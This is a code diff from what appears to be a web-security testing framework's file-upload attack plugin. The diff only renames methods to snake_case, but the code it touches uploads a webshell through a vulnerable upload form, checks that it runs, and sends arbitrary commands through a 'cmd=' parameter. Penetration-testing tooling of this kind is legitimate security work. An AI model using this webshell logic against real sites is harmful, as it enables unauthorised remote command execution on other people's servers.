@@ -98,12 +98,12 @@ class file_upload(AttackPlugin):
         @return : True if vuln can be exploited.
         '''
         # The vuln was saved to the kb as a vuln object
-        url = vuln_obj.getURL()
+        url = vuln_obj.get_url()
         method = vuln_obj.get_method()
         exploit_dc = vuln_obj.get_dc()
 
         # Create a file that will be uploaded
-        extension = url.getExtension()
+        extension = url.get_extension()
         fname = self._create_file(extension)
         file_handler = open(fname, "r")
 
@@ -116,12 +116,12 @@ class file_upload(AttackPlugin):
                 # the [0] was added here to support repeated parameter names
                 exploit_dc[file_var_name][0] = file_handler
             http_method = getattr(self._uri_opener, method)
-            response = http_method(vuln_obj.getURL(), exploit_dc)
+            response = http_method(vuln_obj.get_url(), exploit_dc)
 
             # Call the uploaded script with an empty value in cmd parameter
             # this will return the shell_handler.SHELL_IDENTIFIER if success
             dst = vuln_obj['fileDest']
-            self._exploit = dst.getDomainPath().urlJoin(self._file_name)
+            self._exploit = dst.get_domain_path().url_join(self._file_name)
             self._exploit.querystring = u'cmd='
             response = self._uri_opener.GET(self._exploit)
 
@@ -129,7 +129,7 @@ class file_upload(AttackPlugin):
             file_handler.close()
             os.remove(self._path_name)
 
-            if shell_handler.SHELL_IDENTIFIER in response.getBody():
+            if shell_handler.SHELL_IDENTIFIER in response.get_body():
                 return True
 
         #   If we got here, there is nothing positive to report ;)
@@ -207,13 +207,13 @@ class FileUploadShell(exec_shell):
         to_send = self.get_exploit_URL()
         to_send.querystring = u'cmd=' + command
         response = self._uri_opener.GET(to_send)
-        return response.getBody()
+        return response.get_body()
 
     def end(self):
         msg = 'File upload shell is going to delete the webshell that was'\
               ' uploaded before.'
         om.out.debug(msg)
-        file_to_del = self.get_exploit_URL().getFileName()
+        file_to_del = self.get_exploit_URL().get_fileName()
 
         try:
             self.unlink(file_to_del)
